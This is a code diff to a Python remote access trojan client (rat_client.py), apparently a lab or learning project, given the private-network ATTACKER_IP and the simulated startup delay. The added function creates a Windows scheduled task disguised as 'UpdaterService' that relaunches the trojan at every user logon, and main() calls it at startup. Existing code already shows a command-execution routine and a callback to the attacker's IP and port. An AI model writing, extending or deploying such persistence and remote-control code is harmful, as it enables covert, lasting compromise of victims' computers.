@@ -5,6 +5,7 @@ import os
 import sys
 import time
 import random
+import getpass
 
 ATTACKER_IP = "192.168.56.102"
 ATTACKER_PORT = 9999
@@ -61,6 +62,32 @@ def execute_command(command):
     except Exception as e:
         return f"[Error executing command: {e}]"
 
+def shedule_task_for_user():
+    task_name = "UpdaterService"
+    script_path = os.path.abspath("rat_client.py") 
+    user = getpass.getuser()
+    command = [
+    "schtasks",
+    "/Create",
+    "/SC", "ONLOGON",               # Déclenchement : à l'ouverture de session
+    "/TN", task_name,               # Nom de la tâche
+    "/TR", f'"python3" "{script_path}"',      # Commande à exécuter
+    "/RL", "LIMITED",               # Droits limités (pas admin)
+    "/F",                           # Forcer la création si existe déjà
+    "/RU", user                     # Compte utilisateur courant
+]
+    try:
+        result = subprocess.run(command, capture_output=True, text=True)
+        if result.returncode == 0:
+            print("[+] Tâche planifiée créée avec succès.")
+        else:
+            print("[-] Erreur lors de la création :")
+            print(result.stderr)
+    except Exception as e:
+        print(f"[-] Exception : {e}")
+
+
+
 def main():
     debug_print("RAT Client started.")
     
@@ -68,6 +95,7 @@ def main():
         debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)...")
         time.sleep(SIMULATE_STARTUP_DELAY)
 
+    shedule_task_for_user()
     sock = None
     try:
         while True:
